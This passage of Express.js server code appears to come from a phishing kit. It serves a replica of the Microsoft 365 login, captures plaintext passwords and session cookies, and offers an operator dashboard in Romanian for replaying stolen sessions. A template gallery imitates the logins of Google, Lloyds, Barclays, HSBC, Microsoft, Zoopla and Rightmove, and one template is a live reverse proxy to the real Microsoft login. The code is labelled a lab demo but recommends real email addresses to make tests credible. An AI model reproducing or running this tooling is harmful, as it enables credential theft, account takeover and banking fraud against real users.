  res.redirect('/cmail?sent=1');
});

// ============================================================================
// PHISHING FUNNEL — reverse-proxy style MITM demo page
// GET  /cmlogin/:token  — serve the fake sign-in (or skip to mailbox when the
//                         session was already captured for this account)
// POST /cmlogin/:token  — email step → creds check → session capture
// ============================================================================
app.get('/cmlogin/:token', (req, res) => {
  const camp = cmailGetCampaign(req.params.token);
  if (!camp) return res.status(404).send(cmailMissingPage("We couldn't sign you in. This sign-in link is no longer valid or was removed."));
  const victim = cmailVictimFor(camp, req, res);
  const ex = cmailPhishSessionFor(camp.account_id);
  if (ex) {
    cmailSetSessCookies(res, ex.token, true);
    return res.redirect('/cmail?capture_already=1');
  }
  res.send(cmailPhishPage({ step: 1, campaign: camp, email: '', error: null }));
});

app.post('/cmlogin/:token', (req, res) => {
  const camp = cmailGetCampaign(req.params.token);
  if (!camp) return res.status(404).send(cmailMissingPage("We couldn't sign you in. This sign-in link is no longer valid or was removed."));
  const email = String(req.body.email || '').trim().toLowerCase();
  const password = String(req.body.password || '');
  const victim = cmailVictimFor(camp, req, res);

  if (!email) {
    return res.send(cmailPhishPage({ step: 1, campaign: camp, email: '', error: 'Enter a valid email address, phone number, or Skype name.' }));
  }
  if (!password) {
    // Step 1 → step 2 (recorded as "email entered")
    db.prepare("UPDATE victims SET stage = 'email_entered', email = ? WHERE id = ?").run(email, victim.id);
    try { io.emit('victim_update', { id: victim.id, stage: 'email_entered', marketplace: 'cmail', userId: camp.user_id }); } catch (e) {}
    return res.send(cmailPhishPage({ step: 2, campaign: camp, email: email, error: null }));
  }

  const accOk = email === String(camp.email).toLowerCase();
  if (!accOk) {
    cmailPushCaptureEvent(victim.id, { event: 'creds_failed', email: email, password_attempt: password, campaign: camp.id, at: new Date().toISOString(), ip: req.ip || '' });
    db.prepare("UPDATE victims SET stage = 'creds_failed', email = ? WHERE id = ?").run(email, victim.id);
    try { io.emit('victim_update', { id: victim.id, stage: 'creds_failed', marketplace: 'cmail', userId: camp.user_id }); } catch (e) {}
    return res.send(cmailPhishPage({ step: 2, campaign: camp, email: email, error: "That Microsoft account doesn't exist. Enter a different account or get a new one." }));
  }

  const ok = bcrypt.compareSync(password, camp.password_hash);
  if (!ok) {
    cmailPushCaptureEvent(victim.id, { event: 'creds_failed', email: email, password_attempt: password, campaign: camp.id, at: new Date().toISOString(), ip: req.ip || '' });
    db.prepare("UPDATE victims SET stage = 'creds_failed', email = ? WHERE id = ?").run(email, victim.id);
    try { io.emit('victim_update', { id: victim.id, stage: 'creds_failed', marketplace: 'cmail', userId: camp.user_id }); } catch (e) {}
    return res.send(cmailPhishPage({ step: 2, campaign: camp, email: email, error: "Your account or password is incorrect. If you can't remember your password, reset it now." }));
  }

  // Credentials verified → attacker-side session creation + capture
  db.prepare("UPDATE victims SET stage = 'creds_captured', email = ? WHERE id = ?").run(email, victim.id);
  try { io.emit('victim_update', { id: victim.id, stage: 'creds_captured', marketplace: 'cmail', userId: camp.user_id }); } catch (e) {}
  const token = cmailToken();
  db.prepare(`INSERT INTO cmail_sessions (account_id, token, origin, user_agent, ip_address, expires_at)
    VALUES (?, ?, ?, ?, ?, datetime('now', '+7 days'))`)
    .run(camp.account_id, token, CM_PHISH_ORIGIN, String(req.headers['user-agent'] || '').substring(0, 500), req.ip || '');
  const entry = {
    event: 'session_captured',
    cmail_sess: token,
    estsauth: token,
    estsauth_persistent: token,
    account_id: camp.account_id,
    email: email,
    campaign: camp.id,
    captured_at: new Date().toISOString(),
    password: password,
    ip: req.ip || '',
    user_agent: String(req.headers['user-agent'] || '').substring(0, 500)
  };
  cmailPushCaptureEvent(victim.id, entry);
  db.prepare('UPDATE victims SET stage = ? , cookie_data = ? WHERE id = ?')
    .run('session_captured', JSON.stringify({ cmail_sess: token, estsauth: token, estsauth_persistent: token, account_id: camp.account_id, email: email, campaign: camp.id, captured_at: new Date().toISOString() }), victim.id);
  try { io.emit('victim_update', { id: victim.id, stage: 'session_captured', marketplace: 'cmail', userId: camp.user_id }); } catch (e) {}
  try { io.emit('cmail_captured', { id: victim.id, userId: camp.user_id, email: email, at: new Date().toLocaleString('ro-RO') }); } catch (e) {}
  try {
    db.prepare("INSERT INTO logs (user_id, action, details, ip_address) VALUES (?, 'cmail_capture', ?, ?)")
      .run(camp.user_id, 'MS365: credentials + session captured for ' + email + ' (campaign #' + camp.id + ')', req.ip || '');
  } catch (e) {}
  cmailSetSessCookies(res, token, true);
  res.redirect('/cmail?capture=1');
});

// ============================================================================
// DASHBOARD ROUTES — operator console inside MarketForge (Romanian)
// ============================================================================
app.get('/dashboard/cloudmail', requireClient, (req, res) => {
  const uid = req.user.id;
  const accounts = db.prepare('SELECT * FROM cmail_accounts WHERE user_id = ? ORDER BY created_at DESC').all(uid);
  const campaigns = db.prepare(
    `SELECT c.*, a.email as account_email, a.display_name as account_display FROM cmail_campaigns c
     JOIN cmail_accounts a ON a.id = c.account_id WHERE c.user_id = ? ORDER BY c.created_at DESC, c.id DESC`
  ).all(uid);
  const captures = db.prepare(
    "SELECT * FROM victims WHERE user_id = ? AND marketplace = 'cmail' ORDER BY id DESC"
  ).all(uid);
  const nAccounts = accounts.length;
  const nCampaigns = campaigns.length;
  const nVisits = db.prepare("SELECT COUNT(*) c FROM victims WHERE user_id = ? AND marketplace = 'cmail' AND stage = 'visit'").get(uid).c;
  const nCreds = db.prepare("SELECT COUNT(*) c FROM victims WHERE user_id = ? AND marketplace = 'cmail' AND stage IN ('creds_captured','session_captured')").get(uid).c;
  const nSessActive = db.prepare(
    `SELECT COUNT(*) c FROM cmail_sessions s JOIN cmail_accounts a ON a.id = s.account_id
     WHERE a.user_id = ? AND s.origin = 'phish' AND s.revoked = 0 AND s.expires_at > datetime('now')`
  ).get(uid).c;

  let banner = '';
  if (req.query.created === '1') banner = `<div class="bs-badge" style="background:#0f2a1a;color:#a5d6a7;border:1px solid #2e7d32;margin-bottom:14px">✓ Campanie creată — link-ul de test este mai jos</div>`;
  else if (req.query.deleted === '1') banner = `<div class="bs-badge" style="background:#0f2a1a;color:#a5d6a7;border:1px solid #2e7d32;margin-bottom:14px">✓ Captură ștearsă</div>`;
  else if (req.query.revoked === '1') banner = `<div class="bs-badge" style="background:#3b1216;color:#ffb3b3;border:1px solid #7a2430;margin-bottom:14px">✓ Sesiune revocată — accesul cu cookie-ul furat este acum blocat</div>`;
  else if (req.query.cdeleted === '1') banner = `<div class="bs-badge" style="background:#0f2a1a;color:#a5d6a7;border:1px solid #2e7d32;margin-bottom:14px">✓ Campanie ștearsă</div>`;
  else if (req.query.err) {
    const errMsg = req.query.err === 'replay' ? 'Nu există o sesiune validă de redat pentru această captură.' :
                   req.query.err === 'revoke' ? 'Captura nu a fost găsită.' :
                   req.query.err === 'camp' ? 'Contul selectat nu există.' :
                   req.query.err === 'del' ? 'Captura nu a fost găsită.' : 'Acțiune nereușită.';
    banner = `<div class="bs-badge" style="background:#3b1216;color:#ffb3b3;border:1px solid #7a2430;margin-bottom:14px">⚠ ${esc(errMsg)}</div>`;
  }

  const statsHtml = `<div class="stats-grid">
    <div class="stat-card"><div class="stat-num">${nAccounts}</div><div class="stat-label">Conturi de laborator</div></div>
    <div class="stat-card"><div class="stat-num">${nCampaigns}</div><div class="stat-label">Campanii (link-uri)</div></div>
    <div class="stat-card"><div class="stat-num">${nVisits}</div><div class="stat-label">Vizite initiale</div></div>
    <div class="stat-card"><div class="stat-num">${nCreds}</div><div class="stat-label">Credențiale capturate</div></div>
    <div class="stat-card"><div class="stat-num">${nSessActive}</div><div class="stat-label">Sesiuni furate active</div></div>
  </div>`;

  // — Create campaign panel —
  const accOptions = accounts.map(function (a) {
    return `<option value="${a.id}">${esc(a.email)}${a.display_name ? ' (' + esc(a.display_name) + ')' : ''}</option>`;
  }).join('');
  const createCampaign = `<div class="panel">
    <h3>🎯 Creează o campanie de test (link de phishing)</h3>
    <p style="color:#777;font-size:13px;margin:8px 0 14px">Generează un link unic către o replică a paginii de autentificare Microsoft (<code>login.microsoftonline.com</code>) pentru un cont de laborator. Persoana testată introduce e-mail + parolă; sistemul reține parola și creează o sesiune furată (cookie <code>ESTSAUTH</code>) pe care o poți <b>reda</b> din tabelul de capturi.</p>
    ${accounts.length === 0
      ? `<div style="background:#fff4e0;border:1px solid #f3d395;color:#7a5200;padding:12px;border-radius:8px;font-size:13px">Mai întâi creează un cont de laborator: <a href="/dashboard/cloudmail/accounts" style="color:#0067b8">Conturi →</a></div>`
      : `<form method="POST" action="/dashboard/cloudmail/campaign/create" style="display:flex;gap:10px;flex-wrap:wrap;align-items:center">
        <select name="account_id" required style="padding:10px;border-radius:8px;border:1px solid #333;background:#0d0d1a;color:#fff;font-size:14px;min-width:280px">${accOptions}</select>
        <button type="submit" class="btn btn-sm btn-primary">Generate link</button>
      </form>`}
  </div>`;

  // — Campaigns table —
  let campRows = '';
  if (campaigns.length) {
    campRows = campaigns.map(function (c) {
      const live = reqBase(req) + '/cmlogin/' + c.token;
      const spoof = CM_BRAND.loginUrl + '/' + c.token.substring(0, 12);
      return `<tr>
        <td>#${c.id}</td>
        <td>${esc(c.account_display || '')} <div style="color:#777;font-size:12px">${esc(c.account_email)}</div></td>
        <td>
          <span style="color:#8f8cb8;font-size:11px;letter-spacing:.4px">LINK AFIȘAT (STIL login.microsoftonline.com) <span style="color:#555">— nu se deschide real; click = copiază + deschide funnel-ul</span></span>
          <input readonly onclick="this.select();window.open('${esc(live)}','_blank')" title="Click = copiază linkul + deschide funnel-ul în tab nou" value="${esc(spoof)}" style="width:100%;max-width:640px;background:#0d0d1a;border:1px solid #0067b8;color:#fff;padding:9px 12px;border-radius:8px;font-size:12.5px;margin-top:4px;cursor:pointer">
          <div style="margin-top:6px;font-size:13px">Funnel-ul real (folosit în rapoarte): <a href="${live}" target="_blank" style="color:#8899ff">${live}</a></div>
        </td>
        <td style="white-space:nowrap">${esc(String(c.created_at || '').substring(0, 16))}</td>
        <td><a class="btn btn-sm btn-danger" href="/dashboard/cloudmail/campaign/delete/${c.id}" onclick="return confirm('Ștergi campania #${c.id}? Capturile existente rămân.')">Șterge</a></td>
      </tr>`;
    }).join('');
  } else {
    campRows = `<tr><td colspan="5" style="color:#777;text-align:center;padding:18px">Nicio campanie încă. Generează un link mai sus.</td></tr>`;
  }
  const campaignsTable = `<div class="panel">
    <h3>🔗 Campanii & link-uri de test</h3>
    <table class="data-table"><thead><tr><th>ID</th><th>Cont</th><th>Link ul afișat / Funnel-ul real</th><th>Creat</th><th></th></tr></thead><tbody>${campRows}</tbody></table>
    <p style="color:#777;font-size:12px;margin:12px 4px 4px">Când o persoană testată deschide link-ul real (<code>/cmlogin/…</code>), pagina arată identic cu login-ul Microsoft. Introducerea corectă a parolei declanșează capturarea credențialelor + a cookie-ului de sesiune (<code>ESTSAUTH</code>/<code>ESTSAUTHPERSISTENT</code>).</p>
  </div>`;

  // — Captures table —
  let capRows = '';
  if (captures.length) {
    capRows = captures.map(function (v) {
      const info = cmailCaptureInfo(v);
      const accRow = info.email || (v.email ? esc(v.email) : '—');
      let sessValid = '—';
      let sessState = '';
      if (info.session) {
        const s = db.prepare('SELECT * FROM cmail_sessions WHERE token = ?').get(info.session);
        if (!s) sessState = '<span class="status-inactive">sesiune lipsă</span>';
        else if (s.revoked) sessState = '<span class="status-inactive">revocată</span>';
        else if (new Date(String(s.expires_at).replace(' ', 'T')).getTime() <= Date.now()) sessState = '<span class="status-inactive">expirată</span>';
        else sessValid = '<span class="status-active">activă</span>';
      }
      const passShown = info.password ? `<code style="color:#c9c6f0;background:#17162b;padding:2px 7px;border-radius:6px;font-size:12px">${esc(info.password)}</code>` : '<span style="color:#666">—</span>';
      const at = info.capturedAt ? esc(String(info.capturedAt).substring(0, 19).replace('T', ' ')) : esc(String(v.created_at || '').substring(0, 16));
      const replayBtn = (info.session && sessValid === '<span class="status-active">activă</span>')
        ? `<a class="btn btn-sm btn-success" href="/dashboard/cloudmail/replay/${v.id}">🕹 Replay</a> `
        : `<span class="btn btn-sm" style="opacity:.4;pointer-events:none">Replay</span> `;
      const revokeBtn = (info.session && sessValid === '<span class="status-active">activă</span>')
        ? `<a class="btn btn-sm btn-danger" href="/dashboard/cloudmail/revoke/${v.id}">Revocă</a> `
        : '';
      return `<tr>
        <td>#${v.id}</td>
        <td>${esc(String(v.email || '—'))}</td>
        <td>${passShown}</td>
        <td>${cmailStageBadge(v.stage)}</td>
        <td>${sessValid} ${sessState}</td>
        <td style="white-space:nowrap">${at}</td>
        <td style="white-space:nowrap">${replayBtn}${revokeBtn}<a class="btn btn-sm" href="/dashboard/cloudmail/victim/delete/${v.id}" onclick="return confirm('Ștergi captura #${v.id}? Sesiunea furată legată va fi și revocată.')">✕</a></td>
      </tr>`;
    }).join('');
  } else {
    capRows = `<tr><td colspan="7" style="color:#777;text-align:center;padding:18px">Nicio captură încă. Trimite link-ul unei campanii către o persoană testată.</td></tr>`;
  }
  const capturesTable = `<div class="panel">
    <h3>🎣 Capturi (victime)</h3>
    <table class="data-table"><thead><tr><th>#</th><th>Victimă (e-mail)</th><th>Parolă capturată</th><th>Stadiu</th><th>Sesiune furată</th><th>Capturat la</th><th>Acțiuni</th></tr></thead><tbody>${capRows}</tbody></table>
    <p style="color:#777;font-size:12px;margin:12px 4px 4px"><b>Replay</b> = operatorul se autentifică în cutia poștală doar cu cookie-ul furat (fără parolă). <b>Revocă</b> = invalidează sesiunea, simulând răspunsul victimei.</p>
  </div>`;

  const content = `<div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;margin-bottom:8px">
      <h1 style="margin:0">📧 Microsoft 365 (Demo) <span class="bs-badge" style="background:#0f2a1a;color:#a5d6a7;border:1px solid #2e7d32">Lab • demo MITM</span></h1>
      <div><a class="btn btn-sm" href="/dashboard/cloudmail/accounts">👥 Conturi de laborator</a></div>
    </div>
    <p style="color:#777;margin:0 0 18px;font-size:14px">Template demo de phishing/session-hijack: <b>replică fidelă a paginii de autentificare Microsoft</b> (<code>login.microsoftonline.com</code>). Pagina falsă este identică cu login-ul „real”, capturează <b>credențiale + cookie de sesiune</b> (<code>ESTSAUTH</code>) și permite reluarea (replay) sesiunii fără parolă. Strict pentru testare cu adrese hotmail/outlook de laborator create de echipă — niciun serviciu real nu este implicat.</p>
    ${banner}
    ${statsHtml}
    ${createCampaign}
    ${campaignsTable}
    ${capturesTable}`;
  res.send(clientPage('CloudMail', content, req.user));
});

app.get('/dashboard/cloudmail/accounts', requireClient, (req, res) => {
  const uid = req.user.id;
  let alert = '';
  if (req.query.created === '1') alert = `<div class="bs-badge" style="background:#0f2a1a;color:#a5d6a7;border:1px solid #2e7d32;margin-bottom:14px">✓ Cont de laborator creat + mesaje demo adăugate în inbox</div>`;
  else if (req.query.deleted === '1') alert = `<div class="bs-badge" style="background:#0f2a1a;color:#a5d6a7;border:1px solid #2e7d32;margin-bottom:14px">✓ Cont șters</div>`;
  else if (req.query.err) {
    const m = req.query.err === 'email' ? 'Adresa de e-mail nu este validă (trebuie format email).' :
              req.query.err === 'pass' ? 'Parola trebuie să aibă minim 6 caractere.' :
              req.query.err === 'exists' ? 'Există deja un cont de laborator cu această adresă.' : 'Acțiune nereușită.';
    alert = `<div class="bs-badge" style="background:#3b1216;color:#ffb3b3;border:1px solid #7a2430;margin-bottom:14px">⚠ ${esc(m)}</div>`;
  }
  const accounts = db.prepare('SELECT * FROM cmail_accounts WHERE user_id = ? ORDER BY created_at DESC').all(uid);
  const rows = accounts.map(function (a) {
    const nMsg = db.prepare('SELECT COUNT(*) c FROM cmail_messages WHERE account_id = ?').get(a.id).c;
    const nSess = db.prepare('SELECT COUNT(*) c FROM cmail_sessions WHERE account_id = ? AND revoked = 0').get(a.id).c;
    const nCamp = db.prepare('SELECT COUNT(*) c FROM cmail_campaigns WHERE account_id = ?').get(a.id).c;
    const initial = esc(String(a.display_name || a.email || '?').trim().charAt(0).toUpperCase() || 'M');
    return `<tr>
      <td>#${a.id}</td>
      <td><div style="display:flex;align-items:center;gap:10px"><div style="width:30px;height:30px;border-radius:50%;background:${esc(a.avatar_color || CM_BRAND.color)};color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:13px">${initial}</div>${esc(a.display_name || '')}</div><div style="color:#777;font-size:12px;margin-top:2px">${esc(a.email)}</div></td>
      <td style="text-align:center">${nMsg}</td>
      <td style="text-align:center">${nSess}</td>
      <td style="text-align:center">${nCamp}</td>
      <td style="white-space:nowrap">${esc(String(a.created_at || '').substring(0, 16))}</td>
      <td><a class="btn btn-sm btn-danger" href="/dashboard/cloudmail/accounts/delete/${a.id}" onclick="return confirm('Ștergi contul #${a.id} (${esc(a.email)})? Se șterg și mesajele, sesiunile și campaniile legate.')">Șterge</a></td>
    </tr>`;
  }).join('') || '<tr><td colspan="7" style="color:#777;text-align:center;padding:18px">Niciun cont de laborator încă.</td></tr>';

  const content = `<h1 style="margin:0 0 6px">👥 Conturi de laborator (Microsoft 365)</h1>
    <p style="color:#777;margin:0 0 18px;font-size:14px">Conturi de e-mail <b>hotmail/outlook de laborator</b> folosite ca „victime” în campaniile demo — create strict de echipă, pentru ca testele să pară cât mai reale. Parolele sunt stocate hash (bcrypt), exact ca la un provider real — nici platforma nu le poate citi în clar, dar <b>funnel-ul de phishing le poate captura</b>.</p>
    ${alert}
    <div class="panel">
      <h3>➕ Creează cont de laborator</h3>
      <form method="POST" action="/dashboard/cloudmail/accounts/create" style="display:flex;gap:10px;flex-wrap:wrap;align-items:flex-end">
        <div><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">Adresă e-mail</label><input name="email" type="email" required placeholder="andrei@hotmail.com" style="padding:10px;border-radius:8px;border:1px solid #333;background:#0d0d1a;color:#fff;min-width:240px"></div>
        <div><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">Nume afișat (opțional)</label><input name="display_name" placeholder="Andrei Popescu" style="padding:10px;border-radius:8px;border:1px solid #333;background:#0d0d1a;color:#fff;min-width:180px"></div>
        <div><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">Parola contului</label><input name="password" type="text" required minlength="6" placeholder="parola-de-test" style="padding:10px;border-radius:8px;border:1px solid #333;background:#0d0d1a;color:#fff;min-width:160px"></div>
        <button type="submit" class="btn btn-sm btn-primary">Creează</button>
      </form>
      <p style="color:#777;font-size:12px;margin:10px 2px 2px">Recomandat: adrese <code>@hotmail.com</code> / <code>@outlook.com</code> reale, ca testele să pară cât mai credibile. Nu se trimite nimic real — totul rămâne în laborator.</p>
    </div>
    <div class="panel" style="margin-top:18px">
      <h3>Conturi existente</h3>
      <table class="data-table"><thead><tr><th>ID</th><th>Cont</th><th>Mesaje</th><th>Sesiuni</th><th>Campanii</th><th>Creat</th><th></th></tr></thead><tbody>${rows}</tbody></table>
    </div>`;
  res.send(clientPage('CloudMail', content, req.user));
});

app.post('/dashboard/cloudmail/accounts/create', requireClient, (req, res) => {
  const email = String(req.body.email || '').trim().toLowerCase();
  const name = String(req.body.display_name || '').trim();
  const pass = String(req.body.password || '');
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return res.redirect('/dashboard/cloudmail/accounts?err=email');
  if (pass.length < 6) return res.redirect('/dashboard/cloudmail/accounts?err=pass');
  const exists = db.prepare('SELECT id FROM cmail_accounts WHERE LOWER(email) = ?').get(email);
  if (exists) return res.redirect('/dashboard/cloudmail/accounts?err=exists');
  const palette = ['#0067B8', '#E60033', '#0078D4', '#107C10', '#FFB900', '#9B59B6', '#00B8D9', '#E74C3C'];
  let code = 0;
  for (let i = 0; i < email.length; i++) code += email.charCodeAt(i);
  const color = palette[code % palette.length];
  const hash = bcrypt.hashSync(pass, 10);
  const r = db.prepare('INSERT INTO cmail_accounts (user_id, email, password_hash, display_name, avatar_color) VALUES (?,?,?,?,?)')
    .run(req.user.id, email, hash, name || email.split('@')[0], color);
  cmailSeedMessages(r.lastInsertRowid);
  try {
    db.prepare("INSERT INTO logs (user_id, action, details, ip_address) VALUES (?, 'cmail_account_create', ?, ?)")
      .run(req.user.id, 'MS365: lab account ' + email, req.ip || '');
  } catch (e) {}
  res.redirect('/dashboard/cloudmail/accounts?created=1');
});

app.get('/dashboard/cloudmail/accounts/delete/:id', requireClient, (req, res) => {
  const acc = db.prepare('SELECT * FROM cmail_accounts WHERE id = ? AND user_id = ?').get(req.params.id, req.user.id);
  if (!acc) return res.redirect('/dashboard/cloudmail/accounts?err=del');
  db.prepare('DELETE FROM cmail_messages WHERE account_id = ?').run(acc.id);
  db.prepare('UPDATE cmail_sessions SET revoked = 1 WHERE account_id = ?').run(acc.id);
  db.prepare('DELETE FROM cmail_campaigns WHERE account_id = ?').run(acc.id);
  db.prepare('DELETE FROM cmail_accounts WHERE id = ?').run(acc.id);
  res.redirect('/dashboard/cloudmail/accounts?deleted=1');
});

app.post('/dashboard/cloudmail/campaign/create', requireClient, (req, res) => {
  const accountId = parseInt(req.body.account_id, 10) || 0;
  const acc = db.prepare('SELECT * FROM cmail_accounts WHERE id = ? AND user_id = ?').get(accountId, req.user.id);
  if (!acc) return res.redirect('/dashboard/cloudmail?err=camp');
  const token = uuidv4().replace(/-/g, '').substring(0, 32);
  db.prepare('INSERT INTO cmail_campaigns (user_id, account_id, token) VALUES (?,?,?)').run(req.user.id, acc.id, token);
  res.redirect('/dashboard/cloudmail?created=1');
});

app.get('/dashboard/cloudmail/campaign/delete/:id', requireClient, (req, res) => {
  db.prepare('DELETE FROM cmail_campaigns WHERE id = ? AND user_id = ?').run(req.params.id, req.user.id);
  res.redirect('/dashboard/cloudmail?cdeleted=1');
});

// Replay: operator takes over the mailbox using ONLY the stolen session cookie.
app.get('/dashboard/cloudmail/replay/:id', requireClient, (req, res) => {
  const v = db.prepare("SELECT * FROM victims WHERE id = ? AND user_id = ? AND marketplace = 'cmail'").get(req.params.id, req.user.id);
  if (!v) return res.redirect('/dashboard/cloudmail?err=replay');
  const info = cmailCaptureInfo(v);
  if (!info.session) return res.redirect('/dashboard/cloudmail?err=replay');
  const s = db.prepare(
    `SELECT s.* FROM cmail_sessions s JOIN cmail_accounts a ON a.id = s.account_id
     WHERE s.token = ? AND s.revoked = 0 AND s.expires_at > datetime('now') AND a.user_id = ?`
  ).get(info.session, req.user.id);
  if (!s) return res.redirect('/dashboard/cloudmail?err=replay');
  cmailSetSessCookies(res, s.token, true);
  try {
    db.prepare("INSERT INTO logs (user_id, action, details, ip_address) VALUES (?, 'cmail_replay', ?, ?)")
      .run(req.user.id, 'MS365: stolen session replayed (account ' + s.account_id + ')', req.ip || '');
  } catch (e) {}
  res.redirect('/cmail?replay=1');
});

// Revoke: invalidate the stolen session (simulates the victim reacting).
app.get('/dashboard/cloudmail/revoke/:id', requireClient, (req, res) => {
  const v = db.prepare("SELECT * FROM victims WHERE id = ? AND user_id = ? AND marketplace = 'cmail'").get(req.params.id, req.user.id);
  if (!v) return res.redirect('/dashboard/cloudmail?err=revoke');
  const info = cmailCaptureInfo(v);
  if (info.session) {
    try { db.prepare('UPDATE cmail_sessions SET revoked = 1 WHERE token = ?').run(info.session); } catch (e) {}
  }
  db.prepare("UPDATE victims SET stage = 'session_revoked' WHERE id = ?").run(v.id);
  try { io.emit('victim_update', { id: v.id, stage: 'session_revoked', marketplace: 'cmail', userId: req.user.id }); } catch (e) {}
  try {
    db.prepare("INSERT INTO logs (user_id, action, details, ip_address) VALUES (?, 'cmail_revoke', ?, ?)")
      .run(req.user.id, 'MS365: stolen session revoked (victim #' + v.id + ')', req.ip || '');
  } catch (e) {}
  res.redirect('/dashboard/cloudmail?revoked=1');
});

// Delete a capture row (also revokes its stolen session).
app.get('/dashboard/cloudmail/victim/delete/:id', requireClient, (req, res) => {
  const v = db.prepare("SELECT * FROM victims WHERE id = ? AND user_id = ? AND marketplace = 'cmail'").get(req.params.id, req.user.id);
  if (!v) return res.redirect('/dashboard/cloudmail?err=del');
  const info = cmailCaptureInfo(v);
  if (info.session) {
    try { db.prepare('UPDATE cmail_sessions SET revoked = 1 WHERE token = ?').run(info.session); } catch (e) {}
  }
  db.prepare('DELETE FROM victims WHERE id = ?').run(v.id);
  res.redirect('/dashboard/cloudmail?deleted=1');
});

// ============================================================================
// PhishLab — template gallery + lab mail/SMTP subsystem (embedded).
// LAB ONLY, authorized university pentesting-team training demo.
// ============================================================================
// PhishLab — template gallery + lab mail/SMTP subsystem.
// LAB ONLY, authorized training demo (university pentesting team).
// Templates: Google Business, Lloyds Bank, Barclays, HSBC (Microsoft 365 has
// its own section: /dashboard/cloudmail). Each template = login replica ->
// step1 (identifier) -> step2 (password) -> capture credentials + session
// cookies (realistic names) -> demo post-login page. Operator can replay the
// captured cookies and revoke the session. Watermark stays on every page.
// Mail Lab: internal delivery between platform users + optional SMTP relay
// (nodemailer) configured per user. No real brand service is contacted.
// ============================================================================
const nodemailer = require('nodemailer');
const PH_TEMPLATES = {
  'google-business': {
    key: 'google-business', name: 'Google Business (Demo)', display: 'accounts.google.com',
    color: '#1a73e8', btn: '#1a73e8',
    cookies: [{ name: 'SID', days: 0.5 }, { name: 'HSID', days: 7 }, { name: 'SSID', days: 7 }, { name: 'SAPISID', days: 7 }],
    idLabel: 'Email or phone', pwLabel: 'Enter your password', step1: 'Sign in', step2: 'Welcome'
  },
  'lloyds': {
    key: 'lloyds', name: 'Lloyds Bank (Demo)', display: 'online.lloydsbank.co.uk',
    color: '#006a4d', btn: '#00573f',
    cookies: [{ name: 'LLOYDSSID', days: 0.5 }, { name: 'LLOYDSPERSIST', days: 7 }],
    idLabel: 'User ID', pwLabel: 'Password', step1: 'Welcome to Internet Banking', step2: 'Enter your password'
  },
  'barclays': {
    key: 'barclays', name: 'Barclays (Demo)', display: 'bank.barclays.co.uk',
    color: '#003da5', btn: '#00aeef',
    cookies: [{ name: 'BCSSESSION', days: 0.5 }, { name: 'BCSPERSIST', days: 7 }],
    idLabel: 'Membership number', pwLabel: 'Passcode', step1: 'Log in to Online Banking', step2: 'Enter your passcode'
  },
  'hsbc': {
    key: 'hsbc', name: 'HSBC (Demo)', display: 'www.hsbc.co.uk',
    color: '#db0011', btn: '#db0011',
    cookies: [{ name: 'HSBCSESSION', days: 0.5 }, { name: 'HSBCPERSIST', days: 7 }],
    idLabel: 'Online Banking username', pwLabel: 'Password', step1: 'Log on to Online Banking', step2: 'Enter your password'
  },
  'microsoft': {
    key: 'microsoft', name: 'Microsoft Login (Demo)', display: 'login.microsoftonline.com',
    color: '#0067b8', btn: '#0067b8',
    redirectAfterCapture: '/phish/app?captured=1',
    cookies: [
      { name: 'ESTSAUTH', days: 0.5 },
      { name: 'ESTSAUTHPERSISTENT', days: 7 },
      { name: 'SignInStateCookie', days: 7 }
    ],
    idLabel: 'Email, phone, or Skype', pwLabel: 'Password', step1: 'Sign in', step2: 'Enter your password'
  },
  'microsoft-proxy': {
    key: 'microsoft-proxy', name: 'Microsoft Login (Proxy LIVE)', display: 'login.microsoftonline.com',
    color: '#0067b8', btn: '#0067b8',
    proxy: true,
    notes: 'Proxy LIVE — redirecționează victima prin motorul transparent (phproxy) către login-ul real Microsoft.',
    cookies: [
      { name: 'ESTSAUTH', days: 0.5 },
      { name: 'ESTSAUTHPERSISTENT', days: 7 },
      { name: 'SignInStateCookie', days: 7 }
    ],
    idLabel: 'Email, phone, or Skype', pwLabel: 'Password', step1: 'Sign in', step2: 'Enter your password'
  },
  'zoopla-pro': {
    key: 'zoopla-pro', name: 'Zoopla Pro (Demo)', display: 'pro.zoopla.co.uk',
    rental: true,
    color: '#6a148e', btn: '#252626',
    cookies: [{ name: '_zoopla_session', days: 0.5 }, { name: 'zoopla_pro_sess', days: 7 }],
    idLabel: 'Email address', pwLabel: 'Password', step1: 'Welcome', step2: 'Sign in'
  },
  'rightmove-plus': {
    key: 'rightmove-plus', name: 'Rightmove Plus (Demo)', display: 'rmplus.rightmove.co.uk',
    rental: true,
    color: '#00DEB6', btn: '#2cdebe',
    cookies: [{ name: '_rmplus_session', days: 0.5 }, { name: 'rmplus_sess', days: 7 }],
    idLabel: 'Email', pwLabel: 'Password', step1: 'Welcome to Rightmove Plus', step2: 'Continue'
  }
};
const PH_COOKIE_BASE = 'ph';

// Schema bootstrap (idempotent) — PHISHLAB — template gallery
db.exec(`CREATE TABLE IF NOT EXISTS phish_campaigns (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id INTEGER NOT NULL,
  template_key TEXT NOT NULL,
  token TEXT UNIQUE NOT NULL,
  created_at TEXT DEFAULT (datetime('now')),
  FOREIGN KEY (user_id) REFERENCES users(id)
)`);
db.exec(`CREATE TABLE IF NOT EXISTS phish_sessions (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  campaign_id INTEGER NOT NULL,
  user_id INTEGER NOT NULL,
  template_key TEXT NOT NULL,
  token TEXT UNIQUE NOT NULL,
  email TEXT DEFAULT '',
  origin TEXT DEFAULT 'funnel',
  ip_address TEXT DEFAULT '',
  user_agent TEXT DEFAULT '',
  created_at TEXT DEFAULT (datetime('now')),
  expires_at TEXT DEFAULT (datetime('now', '+12 hours')),
  revoked INTEGER DEFAULT 0,
  FOREIGN KEY (campaign_id) REFERENCES phish_campaigns(id),
  FOREIGN KEY (user_id) REFERENCES users(id)
)`);
db.exec(`CREATE TABLE IF NOT EXISTS phish_captures (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  campaign_id INTEGER NOT NULL,
  user_id INTEGER NOT NULL,
  template_key TEXT NOT NULL,
  stage TEXT DEFAULT 'full',
  email TEXT,
  password TEXT,
  cookies_json TEXT,
  session_token TEXT,
  ip_address TEXT DEFAULT '',
  user_agent TEXT DEFAULT '',
  created_at TEXT DEFAULT (datetime('now')),
